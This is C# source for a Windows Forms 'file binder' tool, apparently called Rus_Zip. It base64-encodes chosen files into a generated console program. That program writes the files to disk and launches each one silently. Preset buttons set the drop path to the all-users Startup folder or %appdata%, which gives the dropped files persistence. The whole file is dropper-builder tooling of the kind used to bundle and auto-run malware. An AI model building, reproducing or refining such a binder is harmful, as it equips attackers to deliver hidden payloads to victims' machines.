using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Web;
using System.Security.Cryptography;

namespace Rus_Zip
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        string blah = "";

        private void Form1_Load(object sender, EventArgs e)
        {
            
    }
        string bruv = "";
        
        private void importToolStripMenuItem_Click(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            
            
            
            string[] filename2 = openFileDialog1.FileNames;
            string[] safefilenames = openFileDialog1.SafeFileNames;
            
            foreach (string v in safefilenames)
            {
                bruv = bruv + v + '%'.ToString();
                textBox3.Text = textBox3.Text + ',' + v;
            }
            bruv = bruv + ','.ToString();
            foreach (string r in filename2)
            {
                
                byte[] data = File.ReadAllBytes(r);
                string data2 = Convert.ToBase64String(data);
                bruv = (bruv + data2 + ','.ToString());
                            
            }


            MessageBox.Show("Files Loaded");
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            StreamWriter file2 = new StreamWriter("binded.cs");
            StreamReader templatenb1 = new StreamReader("templatenmv1.txt");
            string datatplt1 = templatenb1.ReadToEnd();
            templatenb1.Close();
            StreamReader templatenb2 = new StreamReader("templatenb2.txt");
            string datatmplt2 = templatenb2.ReadToEnd();
            templatenb2.Close();
            textBox1.Text = ("using System;\r\nusing System.Collections.Generic;\r\nusing System.Diagnostics;\r\nusing System.Linq;\r\nusing System.Runtime.InteropServices;\r\nusing System.Text;\r\nusing System.Threading.Tasks;\r\nusing System.Runtime.InteropServices;\r\nusing System.IO;\r\nusing System.Diagnostics;\r\n\r\nnamespace ConsoleApp4\r\n{\r\n    internal class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            \r\n            string text = \"" + bruv + "\";\r\n\r\n\r\n            \r\n            string[] list = text.Split(',');\r\n            string fileext = list[0];\r\n            string[] fileext2 = fileext.Split('%');\r\n\r\n            int a = 0;\r\n            int b = 0;\r\n            if (fileext2[a] == '%'.ToString())\r\n            {\r\n                Environment.Exit(0);\r\n            }\r\n            for (int i = 1; i < list.Count(); i++, a++)\r\n            {\r\n\r\n                byte[] bytedata = Convert.FromBase64String(list[i]);\r\n                File.WriteAllBytes(@\""+ blah +"\" + fileext2[a], bytedata);\r\n                var p = new Process();\r\n                p.StartInfo = new ProcessStartInfo(\""+ blah +"\"+fileext2[a])\r\n                {\r\n                    UseShellExecute = true\r\n                };\r\n                p.Start();\r\n\r\n\r\n            }\r\n        }\r\n    }\r\n}\r\n");
            file2.Close();
        }

        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void customPathToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            
            
            

        }

        private void button4_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
            folderBrowserDialog.ShowDialog();
            textBox2.Text = folderBrowserDialog.SelectedPath;
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox2.Text = @"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox2.Text = @"%appdata%\";
        }

        private void button5_Click(object sender, EventArgs e)
        {
            blah = textBox2.Text;
            MessageBox.Show("Successfully Changed Path");
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
